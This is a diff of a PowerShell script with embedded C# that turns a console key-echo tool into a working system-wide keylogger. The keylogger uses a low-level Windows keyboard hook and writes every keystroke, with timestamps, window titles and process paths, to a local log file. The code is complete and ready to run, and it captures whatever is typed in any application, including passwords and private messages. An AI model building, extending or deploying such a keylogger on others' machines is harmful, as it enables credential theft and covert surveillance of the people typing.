@@ -1,24 +1,28 @@
-# Keyboard Character Output Tool (Clean & Instant Exit on Ctrl+C)
-$Host.UI.RawUI.WindowTitle = "Keyboard Character Output"
+$Host.UI.RawUI.WindowTitle = "Keyboard Logger (File Output)"
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-Add-Type -TypeDefinition @"
+$csharp = @"
 using System;
 using System.Text;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Windows.Forms;
+using System.IO;
 
 public class KeyTester {
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_SYSKEYDOWN = 0x0104;
-    private const int WM_QUIT = 0x0012;
 
     private static HookProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
     private static IntPtr _lastWindow = IntPtr.Zero;
-    private static uint _mainThreadId = 0;
+    
+    private static byte[] _keyState = new byte[256];
+    private static StringBuilder _titleBld = new StringBuilder(512);
+    private static StringBuilder _pathBld = new StringBuilder(1024);
+    private static StringBuilder _charBld = new StringBuilder(10);
+    
+    private static StreamWriter _writer;
+    private static string _logFilePath = "keyboard_log.txt";
 
     [StructLayout(LayoutKind.Sequential)]
     public struct MSG {
@@ -32,32 +36,33 @@ public class KeyTester {
     }
 
     public static void Start() {
-        _mainThreadId = GetCurrentThreadId();
-
-        // טיפול מידי בלחיצת Ctrl+C ללא חסימות
-        Console.CancelKeyPress += (sender, e) => {
+        Console.CancelKeyPress += (s, e) => {
             e.Cancel = true;
-            Stop();
+            Unhook();
+            Environment.Exit(0);
         };
 
-        _hookID = SetHook(_proc);
+        try {
+            _writer = new StreamWriter(_logFilePath, true, new UTF8Encoding(true));
+            _writer.AutoFlush = true;
+        } catch (Exception ex) {
+            Console.WriteLine("Init Error: " + ex.Message);
+            return;
+        }
 
-        // לולאת הודעות שאינה תלויה ב-Application.Run
+        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
+        if (_hookID == IntPtr.Zero) {
+            Console.WriteLine("Failed to install keyboard hook. Error: " + Marshal.GetLastWin32Error());
+            return;
+        }
+
         MSG msg;
         while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
             TranslateMessage(ref msg);
             DispatchMessage(ref msg);
         }
-
+        
         Unhook();
-    }
-
-    public static void Stop() {
-        Unhook();
-        // שליחת הודעת יציאה ישירות ללולאת ההודעות ב-Thread הראשי
-        PostThreadMessage(_mainThreadId, WM_QUIT, UIntPtr.Zero, IntPtr.Zero);
-        // יציאה מובטחת
-        Environment.Exit(0);
     }
 
     private static void Unhook() {
@@ -65,171 +70,160 @@ public class KeyTester {
             UnhookWindowsHookEx(_hookID);
             _hookID = IntPtr.Zero;
         }
+        if (_writer != null) {
+            _writer.Close();
+            _writer = null;
+        }
     }
 
     private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    private static IntPtr SetHook(HookProc proc) {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
             int scanCode = Marshal.ReadInt32(lParam, 8);
+            IntPtr fgWindow = GetForegroundWindow();
 
-            IntPtr foregroundWindow = GetForegroundWindow();
+            if (fgWindow != _lastWindow) {
+                _lastWindow = fgWindow;
+                
+                uint procId;
+                GetWindowThreadProcessId(fgWindow, out procId);
 
-            if (foregroundWindow != _lastWindow) {
-                _lastWindow = foregroundWindow;
-
-                uint processId = 0;
-                GetWindowThreadProcessId(foregroundWindow, out processId);
-
-                string fullPath = "Unknown";
-                try {
-                    Process p = Process.GetProcessById((int)processId);
-                    fullPath = p.MainModule.FileName;
-                } catch {
-                    try {
-                        Process p = Process.GetProcessById((int)processId);
-                        fullPath = p.ProcessName + ".exe";
-                    } catch {}
+                _pathBld.Length = 0;
+                IntPtr hProc = OpenProcess(0x1000, false, procId);
+                if (hProc != IntPtr.Zero) {
+                    uint size = (uint)_pathBld.Capacity;
+                    QueryFullProcessImageName(hProc, 0, _pathBld, ref size);
+                    CloseHandle(hProc);
                 }
+                
+                string path = _pathBld.Length > 0 ? _pathBld.ToString() : "Unknown";
 
-                StringBuilder titleBuilder = new StringBuilder(512);
-                GetWindowText(foregroundWindow, titleBuilder, titleBuilder.Capacity);
-                string windowTitle = titleBuilder.ToString();
+                _titleBld.Length = 0;
+                GetWindowText(fgWindow, _titleBld, _titleBld.Capacity);
 
-                Console.ForegroundColor = ConsoleColor.DarkYellow;
-                Console.WriteLine("\n\n--- [Path: " + fullPath + " | Title: " + windowTitle + "] ---");
-                Console.ResetColor();
+                string timestamp = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+                _writer.WriteLine(string.Format("\n\n--- [{0}] [Path: {1} | Title: {2}] ---", timestamp, path, _titleBld.ToString()));
             }
 
-            // טיפול ב-Enter וב-Shift+Enter
             if (vkCode == 0x0D) {
                 bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
-
-                Console.ForegroundColor = ConsoleColor.DarkCyan;
-                Console.Write(isShift ? " [Shift+Enter]" : " [Enter]");
-                Console.ResetColor();
-
-                Console.WriteLine();
-
-                if (isShift) {
-                    Console.Write("\t");
-                }
-
+                _writer.Write(isShift ? " [Shift+Enter]\n\t" : " [Enter]\n");
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
 
-            // טיפול ב-Backspace
             if (vkCode == 0x08) {
-                try {
-                    if (Console.CursorLeft > 0) {
-                        Console.Write("\b \b");
-                    }
-                } catch {}
+                _writer.Write("[BS]");
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
 
-            // טיפול ברווח
             if (vkCode == 0x20) {
-                Console.Write(" ");
+                _writer.Write(" ");
                 return CallNextHookEx(_hookID, nCode, wParam, lParam);
             }
 
-            byte[] keyState = new byte[256];
-            for (int i = 0; i < 256; i++) {
-                short state = GetAsyncKeyState(i);
-                if ((state & 0x8000) != 0) {
-                    keyState[i] |= 0x80;
-                }
-            }
+            GetKeyboardState(_keyState);
+            _keyState[0x10] = (byte)((GetAsyncKeyState(0x10) & 0x8000) != 0 ? 0x80 : 0);
+            _keyState[0x11] = (byte)((GetAsyncKeyState(0x11) & 0x8000) != 0 ? 0x80 : 0);
+            _keyState[0x12] = (byte)((GetAsyncKeyState(0x12) & 0x8000) != 0 ? 0x80 : 0);
+            _keyState[0x14] = (byte)(GetKeyState(0x14) & 0x0001); 
 
-            if ((GetKeyState(0x14) & 0x0001) != 0) {
-                keyState[0x14] |= 0x01;
-            }
-
-            uint threadId = GetWindowThreadProcessId(foregroundWindow, IntPtr.Zero);
+            uint threadId = GetWindowThreadProcessId(fgWindow, IntPtr.Zero);
             IntPtr hkl = GetKeyboardLayout(threadId);
 
-            int langId = ((int)hkl) & 0xFFFF;
-            if (langId == 0x040D) {
-                keyState[0x14] = 0;
+            if (((int)(long)hkl & 0xFFFF) == 0x040D) {
+                _keyState[0x14] = 0;
             }
 
-            StringBuilder sb = new StringBuilder(10);
-            int result = ToUnicodeEx((uint)vkCode, (uint)scanCode, keyState, sb, sb.Capacity, 0, hkl);
-
-            if (result > 0) {
-                string character = sb.ToString();
-                if (character.Length > 0 && character[0] >= 32) {
-                    Console.Write(character);
+            _charBld.Length = 0;
+            if (ToUnicodeEx((uint)vkCode, (uint)scanCode, _keyState, _charBld, _charBld.Capacity, 0, hkl) > 0) {
+                if (_charBld.Length > 0 && _charBld[0] >= 32) {
+                    _writer.Write(_charBld[0]);
                 }
             }
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 
-    [DllImport("kernel32.dll")]
-    private static extern uint GetCurrentThreadId();
-
-    [DllImport("user32.dll")]
-    private static extern bool PostThreadMessage(uint idThread, uint msg, UIntPtr wParam, IntPtr lParam);
-
     [DllImport("user32.dll")]
     private static extern sbyte GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
-
+    
     [DllImport("user32.dll")]
     private static extern bool TranslateMessage([In] ref MSG lpMsg);
-
+    
     [DllImport("user32.dll")]
     private static extern IntPtr DispatchMessage([In] ref MSG lpMsg);
-
+    
     [DllImport("user32.dll")]
     private static extern short GetAsyncKeyState(int vKey);
-
+    
     [DllImport("user32.dll")]
     private static extern short GetKeyState(int nVirtKey);
-
+    
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
+    
     [DllImport("user32.dll")]
     private static extern IntPtr GetForegroundWindow();
-
+    
     [DllImport("user32.dll")]
     private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
+    
     [DllImport("user32.dll")]
     private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
-
+    
     [DllImport("user32.dll", CharSet = CharSet.Unicode)]
     private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-
+    
     [DllImport("user32.dll")]
     private static extern IntPtr GetKeyboardLayout(uint idThread);
-
+    
     [DllImport("user32.dll", CharSet = CharSet.Unicode)]
-    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
-
+    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+    
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
-
+    
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
+    
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
+    
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize);
+    
+    [DllImport("kernel32.dll")]
+    private static extern bool CloseHandle(IntPtr hObject);
 }
-"@ -ReferencedAssemblies System.Windows.Forms
+"@
+
+try {
+    Add-Type -TypeDefinition $csharp -ErrorAction Stop
+} catch {
+    Write-Host "Failed to compile KeyTester class:" -ForegroundColor Red
+    Write-Host $_.Exception.Message -ForegroundColor Yellow
+    if ($_.Exception.InnerException) {
+        Write-Host $_.Exception.InnerException.ToString() -ForegroundColor Yellow
+    }
+    return
+}
+
+if (-not ('KeyTester' -as [type])) {
+    Write-Host "Type KeyTester still not found after Add-Type." -ForegroundColor Red
+    return
+}
 
 Clear-Host
-Write-Host "by @israeli1" -ForegroundColor Gray
+Write-Host "Running... Key logs are being saved to keyboard_log.txt" -ForegroundColor Green
 Write-Host "Press Ctrl+C to stop cleanly." -ForegroundColor Gray
 [KeyTester]::Start()
